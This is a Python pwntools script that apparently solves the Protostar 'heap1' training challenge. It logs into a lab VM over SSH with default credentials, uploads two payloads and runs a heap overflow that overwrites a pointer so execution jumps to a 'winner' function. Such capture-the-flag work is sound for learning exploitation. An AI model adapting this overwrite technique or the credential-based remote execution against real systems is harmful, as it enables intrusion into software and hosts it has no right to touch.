#!/usr/bin/env python3
from pwn import *
import re
context.update(arch='i386', os='linux')
context.bits =32

def execute_exploit(payload1, payload2, showOuput=True):
    context.log_level = 'error'
    tmpFile1 = '/tmp/payload1'
    tmpFile2 = '/tmp/payload2'
    #exe = '/bin/bash; /opt/protostar/bin/heap1'
    exe = '/opt/protostar/bin/heap1'
    cmd = '`cat {}` `cat {}`'.format(tmpFile1, tmpFile2)

    s = ssh(host='192.168.12.128', user='user', password='user')
    s.upload_data(payload1, tmpFile1)
    s.upload_data(payload2, tmpFile2)
    sh = s.run('/bin/bash -c "{} {}"'.format(exe, cmd))
    output = sh.recvallS()
    if showOuput:
        print(output)
    s.close()
    context.log_level = 'info'
    return output

esp = 0xbffffc70
esp = 0xbffff7ac
esp = 0xbffffcac
winner = 0xdeadbeef
winner = 0x8048494

padding = 20
payload1 = b'a'*padding + p32(esp)
payload2 = p32(winner)
line = execute_exploit(payload1, payload2)
log.info("$esp={}".format(hex(esp)))
log.info("$winner={}".format(hex(winner)))
